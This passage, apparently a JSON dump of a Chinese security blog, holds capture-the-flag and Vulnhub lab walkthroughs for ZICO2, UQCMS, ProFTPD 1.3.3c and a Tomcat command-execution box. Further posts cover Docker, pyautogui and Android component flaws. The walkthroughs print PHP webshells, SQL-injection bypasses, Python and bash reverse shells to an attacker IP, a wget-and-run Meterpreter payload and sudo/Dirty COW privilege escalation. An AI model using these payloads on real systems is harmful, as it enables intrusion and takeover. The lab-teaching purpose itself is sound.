&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令 2、Docker为什么比VM快&emsp;&emsp;Docker有着比虚拟机更少的抽象层 &emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS &emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"Vulnhub——ZICO2:1","slug":"Vulnhub——ZICO2-1","date":"2021-12-08T16:02:21.000Z","updated":"2022-01-03T03:30:11.867Z","comments":true,"path":"post/da4faa60.html","link":"","permalink":"https://wolke.cn/post/da4faa60.html","excerpt":"","text":"一、靶机说明1、下载链接&emsp;&emsp;靶场镜像：链接: https://www.vulnhub.com/entry/zico2-1,210/ 2、靶机准备（1）重置靶场密码&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e &emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按Crtl+X &emsp;&emsp;mount -o rw,remount /，回车 &emsp;&emsp; passwd root，输入新密码两次 &emsp;&emsp;如果提示改变密码成功，重启该虚拟机 （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 三、信息收集1、探测主机IP&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107 arp-scan -l 2、开放端口与服务扫描&emsp;&emsp;使用nmap对IP进行扫描： nmap -sV 192.168.1.107 &emsp;&emsp;可以看到开启了SSH，HTTP等服务 111端口RPCBIND用于取代旧版本中的portmap组件。简单说，RPCBIND就是为了将不同服务与对应的端口进行绑定，以便支持机器间的相互操作 &emsp;&emsp;访问80端口的服务，是一个网站 3、目录扫描&emsp;&emsp;使用dirsearch扫描 dirsearch -u http://192.168.43.8 &emsp;&emsp;扫出了个/dbadmin目录很可疑 &emsp;&emsp;访问该目录，发现有个PHP文件，点击访问，发现是个后台登录页面，并且提示了框架信息，phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞 四、漏洞探测与利用1、Owasp-zap扫描&emsp;&emsp;使用owasp-zap对网站进行扫描，owasp-zap是一个对网站进行自动漏洞扫描的工具 &emsp;&emsp;扫描结束，Alerts一栏为有漏洞的地方，旗子衍颜色越胜代表漏洞越严重，这里发现其中有一个目录遍历的漏洞，http://192.168.43.8/view.php?page=../../../../../../etc/passwd，进入该页面发现的确爆出了用户名的相关信息 &emsp;&emsp;这里其实也可以在主页，点击CHENC THEM OUT!按钮，会发现URL变成了http://192.168.43.8/view.php?page=tools.html，可能存在文件包含，这样也可以发现的确存在文件包含 &emsp;&emsp;只要看到文件包含这种URL路径，就要想到可以利用的点大概有以下几点 1、 任意url跳转2、 Ssrf3、 文件包含4、 Sql注入 2、爆破密码&emsp;&emsp;后台登录只验证了密码，可以尝试使用字典对其进行爆破，或者使用弱口令，这里密码是admin，直接进入后台 3、信息搜集&emsp;&emsp;在users表可以看到有两个用户信息 &emsp;&emsp;丢到md5解密看看 &emsp;&emsp;得到两个账号密码 用户名：root 密码：34kroot34 用户名：zico 密码：zico2215@ &emsp;&emsp;使用searchsploit phpliteadmin命令，搜索是否有能够利用的EXP，发现确实存在对应版本的利用脚本 &emsp;&emsp;查看说明，意思就是可以利用phpLiteAdmin，创建一个数据库，这个数据库名称起名为xx.php，如果后端没有这个数据库，比如hack.php，会自动创建一个数据库名称的文件，然后在里面填充数据，比如&lt;?php phpinfo()?&gt;，然后访问，会发现执行成功 &emsp;&emsp;这里我有两个想法 用SSH登录账号密码，看能否成功 利用phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞 想法一：用SSH登录&emsp;&emsp;发现事情并不简单，登录失败。 想法二：利用远程php代码执行漏洞&emsp;&emsp;步骤一：返回到数据库管理页面先创造一个.php文件作为数据库 &emsp;&emsp;步骤二：在该数据库（php文件下）创建一个数据表a（随便设置名字） &emsp;&emsp;步骤三：在Default Value下插入一句话木马（因为在这里上传的一句话中引号会被过滤，所以一句话不含单引号；） &lt;?php @eval($_REQUEST[ok]);?&gt; &emsp;&emsp;使用文件包含一句话木马 &emsp;&emsp;步骤五：上菜刀，只是www-data还不是最高的root权限 五、反弹shell方法一：python反弹shell&emsp;&emsp;在kali端监听并且开放端口4444，在页面url使用以下pyhon反shell的payload http://192.168.43.8/view.php?page=../../../../../usr/databases/w01ke.php&amp;ok=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.167&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 方法二：利用php反shell&emsp;&emsp;思路：用kali下msfvenom生成一个后门文件，然后利用之前的一句话木马，命令执行，让靶机将后门文件主动下载到本机，然后弹回shell &emsp;&emsp;首先创建后门文件，名字为shell命令为： msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.167 LPORT=5555 -f elf -o shell &emsp;&emsp;执行命令 cp shell /var/www/html，将后门文件复制到apache的网站根目录 &emsp;&emsp;执行命令 chmod 777 /var/www/html/shell，赋予后门文件可读可写可执行权限 &emsp;&emsp;执行命令 service apache2 start，启动攻击机的apache服务 &emsp;&emsp;msfconsole监听 use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 192.168.43.167set LPORT 5555exploit &emsp;&emsp;利用之前上传的一句话，让靶机主动下载该文件，反弹shell ok=system(&quot;cd /tmp;wget http://192.168.43.167/shell;chmod 777 shell;./shell&quot;); &emsp;&emsp;进入shell，调用交互式命令行，同时美化命令行 python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 六、提权&emsp;&emsp;进入到/home目录，查看文件，发现所要进行的下一步操作提示 &emsp;&emsp;进入到wordpress目录下，发现wordpress配置文件，使用cat命令查看到账号密码（如果此时看不到，那么到meterpreter界面，利用download命令，将文件下载到本地进行查看download /home/zico/wordpress/wp-config.php /root） &emsp;&emsp;尝试用得到的账号密码，通过22端口的ssh登录主机，登录成功 &emsp;&emsp;下一步就是进行提权，获得root权限，来得到最后的flag 1、zip提权&emsp;&emsp;执行命令：sudo -l，查看哪些命令具有root权限，发现具有root权限的为两个解压用的命令可执行 &emsp;&emsp;可以利用zip命令来进行提权 &emsp;&emsp;在/tmp目录下创建一个exploit名字的文件 touch /tmp/exploit &emsp;&emsp;使用以下命令，提权成功，查看flag sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;sh -c /bin/bash&quot; 2、tar提权sudo /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash 3、脏牛提权wget http://192.168.43.167/dirty.c -O /tmp/dirty.cgcc -pthread dirty.c -o exp -lcrypt # 编译./exp w01ke # 使用exp，后面的w01ke是密码 五、总结&emsp;&emsp;这种自解压的tar和zip提权，需要很多前提条件，真实环境中管理员也不会单独给某个用户zip这样的权限，这种提权方式CTF或许会用到，但是实际环境基本不会有用","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"}],"author":"w01ke"},{"title":"UQCMS——SQL注入","slug":"UQCMS——SQL注入","date":"2021-12-08T15:07:37.000Z","updated":"2022-01-03T03:30:02.308Z","comments":true,"path":"post/6f0081d7.html","link":"","permalink":"https://wolke.cn/post/6f0081d7.html","excerpt":"","text":"一、靶场描述&emsp;&emsp;靶场地址：10.1.0.101 二、信息搜集&emsp;&emsp;使用扫描器扫描网站目录，可以扫到一个adminad.php的php文件 三、漏洞利用——SQL注入&emsp;&emsp;用户名：&#39; or 1=1#即可登录后台 四、上传一句话木马&emsp;&emsp;对其中任意一个html文件进行修改 &emsp;&emsp;随便输入一个haha，抓包看看这个包是怎么样的，可以看到POST中content=haha，haha就是我修改的代码，说明content参数是传入代码的；另外还有个path=header.html，发现路径也是提交内容如果设为path=./xdd.php，那么理论上就可以将该文件命名为xdd.php上传提交到当前目录。 &emsp;&emsp;在content一栏中加入一句话木马，并将路径设为xdd.php，放包提交，即可上传一句话木马 &emsp;&emsp;使用菜刀连接一句话木马即可","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"UQCMS","slug":"UQCMS","permalink":"https://wolke.cn/tags/UQCMS/"}],"author":"w01ke"},{"title":"FTP后门服务——ProFTPD 1.3.3c漏洞利用","slug":"FTP后门服务——ProFTPD-1-3-3c漏洞利用","date":"2021-12-08T14:02:50.000Z","updated":"2022-01-03T03:27:31.806Z","comments":true,"path":"post/b4a57078.html","link":"","permalink":"https://wolke.cn/post/b4a57078.html","excerpt":"","text":"一、靶场说明1、下载链接&emsp;&emsp;链接：https://pan.baidu.com/s/11qkUtAwCTmOFcLa6e-_tyg 提取码：o7cs 2、靶机准备（1）登录&emsp;&emsp;用户名：marlinspike &emsp;&emsp;密码：marlinspike （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 二、信息搜集1、发现靶机IP&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover （1）arp-scan&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.43.165 arp-scan -l （2）netdiscover&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108 ip a &emsp;&emsp;使用netdiscover命令 netdiscover -r ip/子网掩码 命令来探测靶机 netdiscover -r 192.168.1.1/24 2、开放端口与服务探测&emsp;&emsp;对IP地址进行扫描 nmap -sV 192.168.1.103 &emsp;&emsp;发现开启了FTP服务，且版本为 ProFTPD 1.3.3c，而该版本的FTP是存在漏洞的 三、漏洞利用1、搜索漏洞exploit&emsp;&emsp;Kali使用以下命令查看是否有漏洞利用模块 searchsploit ProFTPD 1.3.3c &emsp;&emsp;打开msf，搜索该版本FTP，查看是否有漏洞利用模，发现漏洞利用模块 search ProFTPD 1.3.3c 2、exploituse exploit/unix/ftp/proftpd_133c_backdoor # 使用该漏洞模块show payloads # 查看可使用的payloadset payload cmd/unix/reverse # 选择该攻击载荷set RHOSTS [靶机IP] # 设置目标IPset LHOST [攻击机IP] # 设置本地IPexploit # 发起攻击 3、提权&emsp;&emsp;使用以下命令查看相关信息，发现已经是root权限了，无需提权 idwhoamipwd &emsp;&emsp;python调用本地shell实现交互式命令行，同时美化命令行 python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 四、充电站1、什么是FTP&emsp;&emsp;是文件传输协议的简称。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。 &emsp;&emsp;FTP 是因特网网络上历史最悠久的网络工具，从 1971 年由 A KBHUSHAN 提出第一个 FTP 的RFC（RFC114）至今近半个世纪来，FTP 凭借其独特的优势一直都是因特网中最重要、最广泛的服务之一。 &emsp;&emsp;FTP 的目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。它能操作任何类型的文件而不需要进一步处理，就像MIME或Unicode一样。但是，FTP有着极高的延时，这意味着，从开始请求到第一次接收需求数据之间的时间，会非常长；并且不时的必须执行一些冗长的登录进程 2、searchsploit是什么&emsp;&emsp;顾名思义，它将搜索所有的漏洞和shellcode。它不会包含任何文件和谷歌黑客数据库的结果 &emsp;&emsp;searchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。这种能力特别适用于在没有互联网接入的情况下对网络进行安全评估。许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在我们的Exploit-DB二进制文件中找到。 &emsp;&emsp;如果您预计您将在一个没有Internet的网络环境进行渗透测试，请确保您检查了两个存储库，以获得最完整的数据集","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"FTP","slug":"FTP","permalink":"https://wolke.cn/tags/FTP/"}],"author":"w01ke"},{"title":"Web命令执行+SSH","slug":"Web命令执行+SSH","date":"2021-12-06T17:13:16.000Z","updated":"2022-01-03T03:30:26.259Z","comments":true,"path":"post/bb5c1570.html","link":"","permalink":"https://wolke.cn/post/bb5c1570.html","excerpt":"","text":"一、靶机说明1、下载链接&emsp;&emsp;靶场镜像：链接: https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w 提取码: 97qz 2、靶机准备（1）重置靶场密码&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e &emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按Crtl+X &emsp;&emsp;mount -o rw,remount /，回车 &emsp;&emsp; passwd root，输入新密码两次 &emsp;&emsp;如果提示改变密码成功，重启该虚拟机 （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 二、预备知识&emsp;&emsp;使用 ssh 用户名@localhost 通过ssh登录服务器是不需要身份验证的 三、信息收集1、探测主机IP&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover （1）arp-scan&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107 arp-scan -l （2）netdiscover&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108 ip a &emsp;&emsp;使用netdiscover命令 netdiscover -r ip/子网掩码 命令来探测靶机 netdiscover -r 192.168.1.1/24 2、开放端口与服务扫描&emsp;&emsp;使用nmap对IP进行扫描： nmap -sV 192.168.1.107 &emsp;&emsp;可以看到开放了8080端口，为HTTP服务 &emsp;&emsp;访问8080端口，发现是Tomcat建立成功的初始页面 3、目录扫描&emsp;&emsp;可以使用dirsearch扫描或者nikto探测 （1）dirsearch&emsp;&emsp;目录扫描： dirsearch -u http://192.168.1.107:8080 &emsp;&emsp;扫出了个/test.jsp （2）nikto&emsp;&emsp;使用nikto探测，发现test.jsp可能比较因缺思厅，那么就让我康康！ 四、漏洞探测与利用1、漏洞探测——命令执行&emsp;&emsp;访问：http://192.168.1.107:8080/test.jsp，出现以下页面，这是一个调试页面，可以用来命令执行 2、信息收集&emsp;&emsp;查看临时缓冲目录，没什么有用的信息 ls -alh /tmp/ &emsp;&emsp;查看home目录，挖掘用户信息，发现了bill ls -la /home &emsp;&emsp;查看具体用户bill的目录，我们可以看到具有ssh服务，后续可以使用sudo来拿到root ls /home/bill -lah &emsp;&emsp;查看系统信息，为ubuntu系统 uname -a &emsp;&emsp;查看用户bill在主机上可以使用和禁止的命令，没什么有用的信息 ssh bill@localhost sudo -l 3、反弹shell&emsp;&emsp;关闭防火墙，没有消息就是好消息，关闭防火墙成功 ssh bill@localhost sudo ufw disable &emsp;&emsp;kali打开nc监听某个端口，这里我设置为4444 nc -lvp 4444 &emsp;&emsp;反弹shell ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1 【插播：渗透测试技巧】 &emsp;&emsp;开启python简易http服务器 python -m SimpleHTTPServer &emsp;&emsp;利用命令执行下载木马文件 ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp &emsp;&emsp;拿到flag 五、总结&emsp;&emsp;在CTF比赛中，命令执行漏洞具有很多过滤机制。对于开放ssh服务的靶场机器，可以采取以上方法进行渗透靶场机器。如果没有开放ssh服务，则需要利用绕过过滤技巧来达到命令执行的目的。","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"SSH","slug":"SSH","permalink":"https://wolke.cn/tags/SSH/"},{"name":"命令执行","slug":"命令执行","permalink":"https://wolke.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"author":"w01ke"},{"title":"pyautogui模块","slug":"pyautogui模块","date":"2021-12-06T11:53:27.000Z","updated":"2022-01-03T03:29:16.625Z","comments":true,"path":"post/2681d601.html","link":"","permalink":"https://wolke.cn/post/2681d601.html","excerpt":"","text":"一、GUI控制功能 控制鼠标键盘使用的模块为：pyautogui，这个模块操作起鼠标键盘的时候，非常的迅速，而且如果该模块控制了鼠标后，程序比较难关闭，这时我们有两个方法专门针对以上的情况： 1.1 自动防故障功能pyautogui.FAILSAFE =False 默认这项功能为True, 这项功能意味着：当鼠标的指针在屏幕的最坐上方，程序会报错；目的是为了防止程序无法停止； 1.2 停顿功能pyautogui.PAUSE = 1 意味着所有pyautogui的指令都要暂停一秒；其他指令不会停顿；这样做，可以防止键盘鼠标操作太快； 二、鼠标移动2.1 控制鼠标移动2.1.1 获得屏幕分辨率print(pyautogui.size()) # 返回所用显示器的分辨率； 输出：Size(width=1920, height=1080)width,height = pyautogui.size()print(width,height) # 1920 1080 2.1.2 移动鼠标① 移动到指定位置pyautogui.moveTo(100, 300, duration=1) 将鼠标移动到指定的坐标；duration 的作用是设置移动时间，所有的gui函数都有这个参数，而且都是可选参数 ② 按方向移动（相对移动）pyautogui.moveRel(100, 500, duration=2) # 第一个参数是左右移动像素值，第二个是上下 相对于当前位置移动光标，向右移动100px，向下移动500px, 这个过程持续 4 秒钟； 2.1.3 获取鼠标位置print(pyautogui.position()) # 得到当前鼠标位置；输出：Point(x=200, y=800) 2.2 控制鼠标点击2.2.1 单击鼠标# 点击鼠标pyautogui.click(10, 10) # 鼠标点击指定位置，默认左键pyautogui.click(10, 10, button=&#x27;left&#x27;) # 单击左键pyautogui.click(1000, 300, button=&#x27;right&#x27;) # 单击右键pyautogui.click(1000, 300, button=&#x27;middle&#x27;) # 单击中间 2.2.2 双击鼠标pyautogui.doubleClick(10,10) # 指定位置，双击左键pyautogui.rightClick(10,10) # 指定位置，双击右键pyautogui.middleClick(10,10) # 指定位置，双击中键 2.2.3 点击和释放pyautogui.mouseDown() # 鼠标按下（点击）pyautogui.mouseUp() # 鼠标释放 2.3 控制鼠标拖动2.3.1 拖动到指定位置pyautogui.dragTo(100,300,duration=1) 将鼠标拖动到指定的坐标；duration 的作用是设置移动时间，所有的gui函数都有这个参数，而且都是可选参数； 2.3.2 按方向拖动（相对拖动）pyautogui.dragRel(100,500,duration=4) # 第一个参数是左右移动像素值，第二个是上下 相对光标当前为位置向右拖动100px，向下拖动500px, 这个过程持续 4 秒钟； 2.4 控制鼠标滚动 控制鼠标滚动的函数是scroll()， 传入一个整数的参数，说明向上或向下滚动多少个单位；单位根据操作系统不同而不同； pyautogui.scroll(300) # 向上滚动300个单位pyautogui.scroll(-300) # 向下滚动300个单位 三、屏幕处理3.1 获取屏幕截图 我们控制鼠标的操作，不能盲目的进行，所以我们需要监控屏幕上的内容，从而决定要不要进行对应的操作， pyautogui 提供了一个方法screenshot()，可以返回一个Pillow的image对象； 这里有三个常用函数： im = pyautogui.screenshot()：返回屏幕的截图，是一个Pillow的image对象 im.getpixel((500, 500))：返回im对象上，（500，500）这一点像素的颜色，是一个RGB元组 pyautogui.pixelMatchesColor(500,500,(12,120,400))：是一个对比函数，对比的是屏幕上（500，500）这一点像素的颜色，与所给的元素是否相同； im = pyautogui.screenshot()im.save(&#x27;屏幕截图.png&#x27;) 保存屏幕截图 3.2 识别图像 首先，我们需要先获得一个屏幕快照，例如我们想要点赞，我们就先把大拇指的图片保存下来；然后使用函数：locateOnScreen(&#39;zan.png&#39;) ，如果可以找到图片，则返回图片的位置，如：Box(left=25, top=703, width=22, height=22)；如果找不到图片，则返回None; 如果，屏幕上有多处图片可以匹配，则需要使用locateAllOnScreen(&#39;zan.png&#39;)，如果匹配到多个值，则返回一个list，参考如下： import pyautoguipyautogui.PAUSE = 1# 图像识别（一个）btm = pyautogui.locateOnScreen(&#x27;zan.png&#x27;)print(btm) # Box(left=1280, top=344, width=22, height=22)# 图像识别（多个）btm = pyautogui.locateAllOnScreen(&#x27;zan.png&#x27;)print(list(btm)) # [Box(left=1280, top=344, width=22, height=22), Box(left=25, top=594, width=22, height=22)] pyautogui.center((left, top, width, height)) 返回指定位置的中心点；这样，我们就可以再配合鼠标操作点击找到图片的中心；参考实例： 四、键盘输入4.1 键盘输入函数pyautogui.keyDown(): 模拟按键按下;pyautogui.keyUp(): 模拟按键释放;pyautogui.press(): # 就是调用keyDown() &amp; keyUp(),模拟一次按键；pyautogui.typewrite(&#x27;this&#x27;,0.5) ： 第一参数是输入内容，第二个参数是每个字符间的间隔时间；pyautogui.typewrite([&#x27;T&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;s&#x27;]): typewrite 还可以传入单字母的列表； 举例： pyautogui.keyDown(&#x27;shift&#x27;) # 按下shiftpyautogui.press(&#x27;4&#x27;) # 按下 4pyautogui.keyUp(&#x27;shift&#x27;) # 释放 shift 输出：$ pyautogui.typewrite(&#x27;$$$$&#x27;, 0.5) 输入$$$$，每个字符间隔为0.5s 4.2 键盘特殊按键 有时我们需要输入一些特殊的按键，比如向左的箭头，这些有相对应的键盘字符串表示，例如： pyautogui.typewrite([&#x27;T&#x27;,&#x27;i&#x27;,&#x27;s&#x27;,&#x27;left&#x27;,&#x27;left&#x27;,&#x27;h&#x27;,]) # 输出：This 解释：这里的left就是向左的箭头；诸如此类的键盘字符串，还有很多，参考下表： 4.3 快捷键 如果我们需要模拟复制的快捷键 ctrl + c ，如果用前面的方法，则代码为： pyautogui.keyDown(&#x27;ctrl&#x27;)pyautogui.keyDown(&#x27;c&#x27;)pyautogui.keyUp(&#x27;c&#x27;)pyautogui.keyUp(&#x27;ctrl&#x27;) 快捷键的按键与释放顺序非常关键，这时我们可以使用 pyautogui.hotkey()，这个函数可以接受多个参数，按传入顺序按下，再按照相反顺序释放。上述快捷键 ctrl + c ，可以将代码变为： pyautogui.hotkey(&#x27;ctrl&#x27;,&#x27;c&#x27;) 五、提示信息框5.1 提示框/警告框import pyautoguia = pyautogui.alert(text=&#x27;This is an alert box.&#x27;, title=&#x27;Test&#x27;)print(a) 输出如下图：点击确定，返回值为OK 5.2 选择框import pyautoguia = pyautogui.confirm(&#x27;选择一项&#x27;, buttons=[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])print(a) 输出如下图：点击B选项，返回值为B 5.3 密码输入import pyautoguia = pyautogui.password(&#x27;Enter password (text will be hidden)&#x27;)print(a) 输出如下图：输入密码，显示为密文，点击OK，返回值为刚刚输入的值； 5.4 普通输入import pyautoguia = pyautogui.prompt(&#x27;请输入一个数字：&#x27;)print(a) 输出如下图：显示为明文，点击OK，返回值为刚刚输入的值； 六、实例6.1 鼠标控制：鼠标画一个正方形import pyautoguifor i in range(2): # 画正方形 pyautogui.moveTo(200, 200, duration=1) pyautogui.moveTo(200, 400, duration=1) pyautogui.moveTo(400, 400, duration=0.5) pyautogui.moveTo(400, 200, duration=2) 6.2 获取鼠标的实时位置import pyautoguiimport timetry: while True: x, y = pyautogui.position() posi = &#x27;x:&#x27; + str(x).rjust(4) + &#x27; y:&#x27; + str(y).rjust(4) print(&#x27;\\r&#x27;, posi, end=&#x27;&#x27;) time.sleep(0.5)except KeyboardInterrupt: print(&#x27;已退出！&#x27;) 显示效果： 6.3 获取鼠标位置与所在位置的颜色import pyautoguiimport timetry: while True: x, y = pyautogui.position() rgb = pyautogui.screenshot().getpixel((x, y)) posi = &#x27;x:&#x27; + str(x).rjust(4) + &#x27; y:&#x27; + str(y).rjust(4) + &#x27; RGB:&#x27; + str(rgb) print(&#x27;\\r&#x27;, posi, end=&#x27;&#x27;) time.sleep(0.5)except KeyboardInterrupt: print(&#x27;已退出！&#x27;) 显示效果： 6.4 自动点赞程序 我们需要将所有的说说点赞，本页上的点赞完成后，就滚动鼠标，把新加载的说说也全部点赞； 代码如下： import pyautoguiimport timedef zan(): time.sleep(0.5) # 等待 0.5 秒 left, top, width, height = pyautogui.locateOnScreen(&#x27;qzonezan.png&#x27;) # 寻找 点赞图片； center = pyautogui.center((left, top, width, height)) # 寻找 图片的中心 pyautogui.click(center) # 点击 print(&#x27;点赞成功！&#x27;)while True: if pyautogui.locateOnScreen(&#x27;qzonezan.png&#x27;): zan() # 调用点赞函数 else: pyautogui.scroll(-700) # 本页没有图片后，滚动鼠标； print(&#x27;没有找到目标，屏幕下滚~&#x27;)","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://wolke.cn/tags/%E7%88%AC%E8%99%AB/"}],"author":"w01ke"},{"title":"常见Android组件/控件漏洞","slug":"常见Android组件-控件漏洞","date":"2021-12-06T11:27:35.000Z","updated":"2022-01-15T07:45:54.395Z","comments":true,"path":"post/cb60dfd6.html","link":"","permalink":"https://wolke.cn/post/cb60dfd6.html","excerpt":"","text":"一、前言&emsp;&emsp;对于 Android app 本身来说，也是会存在一些组件安全漏洞的，本文就介绍一些常见的 Android 组件漏洞。 二、Android组件安全&emsp;&emsp;首先要知道，Android 中最重要的风险点就是 android:exported=&quot;true&quot; 这一属性。组件被导出就意味着大概率会产生漏洞。这是不同应用程序间共享数据的唯一方式，因为android 没有提供所有应用共同访问的公共存储区。比如通讯录数据。 &emsp;&emsp;首先了解一下四大组件：activity，service，broadcast，contentprovider。 2.1 四大组件2.1.1 activity&emsp;&emsp;对于 app 来说，每一个界面都是一个 activity，每一个 activity 都会有着不同的功能，比如注册，登录，手势密码等。每一个 activity 的切换需要不同的条件。 2.1.2 service&emsp;&emsp;service 服务，伴随着程序启动，会一直在后台运行，主要是检测作用，检测客户端的状态，上传用户的操作。 2.1.3 broadcast&emsp;&emsp;broadcast 分为两个方面，广播发送者和广播接收者。Android 提供一整套的 api，允许 app 自由的发送和接收广播。 2.1.4 contentprovider&emsp;&emsp;contentProvider是用来保存或者获取数据，并使其对所有应用程序可见。 三、越权绕过&emsp;&emsp;对于 activity 组件，主要会存在越权绕过，比如绕过手势密码，跳过验证阶段。此处可以利用直接启动手势密码之后的活动来进行验证 am start -n 包名/.活动名 &emsp;&emsp;若是可以直接启动，则证明存在越权漏洞。 四、拒绝服务攻击&emsp;&emsp;还有拒绝服务攻击，Android 提供 Intent 机制来协助应用间的交互与通讯，Intent 负责对一次操作的动作、动作涉及的数据进行描述，系统则根据此 Intent 描述，来调用对应的 Activity、 servicer 和 BroadCast 等组件，来完成组件的调用。 &emsp;&emsp;如果程序没有对 **Intent.getXXXExtra() 获取的异常或者畸形数据处理时没有进行异常捕获，就会导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来使该应用崩溃，简单的说就是通过 intent 发送空数据、异常或畸形数据给应用，来实现让应用崩溃的目的。 &emsp;&emsp;对应的不同报错信息 Java.lang.NullPointerException，原因是程序没有对getAction()等获取到的数据进行空指针判断。intent.putExtra(&quot;&quot;, &quot;&quot;);导致空指针异常导致应用崩溃Java.lang.ClassCastException 原因是程序没有getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换Java.lang.IndexOutOfBoundsException，原因是程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断Java.lang.ClassNotFoundException，原因是程序没有无法找到从getSerializableExtra()获取到的序列化类对象的类定义 五、Service服务暴露&emsp;&emsp;以之前版本的某 app 为例，其中的升级服务，传入 PushMsg 的 Serializable 的数据。 &emsp;&emsp;此时恶意伪造并启动暴露的service 六、Broadcast暴露&emsp;&emsp;比如目标程序如下 Intent v1 = new Intent(); v1.setAction(&quot;com.simple.action.server_running&quot;); v1.putExtra(&quot;local_ip&quot;,v0.h); v1.putExtra(&quot;port&quot;,v0.i); v1.putExtra(&quot;code&quot;,v0.g); v1.putExtra(&quot;connected&quot;,v0.s); v1.putExtra(&quot;pwd_predefined&quot;,v0.r); if(!TextUtils.isEmpty(v0.t))&#123; v1.putExtra(&quot;connected_usr&quot;,v0.t); &#125; sendBroadcast(v1);&#125; &emsp;&emsp;该程序通过 intent 隐式传递，并通过 action 匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样就可以通过攻击代码获取敏感数据信息 public void onReceive(Context context,Intent intent)&#123; String s = null; if(intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123; String pwd=intent.getStringExtra(&quot;connected&quot;); s=&quot;Airdroid =&gt; [&quot;+pwd+&quot;]/&quot;+intent.getExtras(); &#125; Toast.makeTest(context,String.format(&quot;%sReceived&quot;,s),Toast.LENGTH_SHORT).show();&#125; 七、Content Provider目录遍历漏洞&emsp;&emsp;Android Content Provider 存在文件目录遍历安全漏洞，该漏洞源于对外暴露 Content Provider组件的应用，没有对 Content Provider 组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的 Content 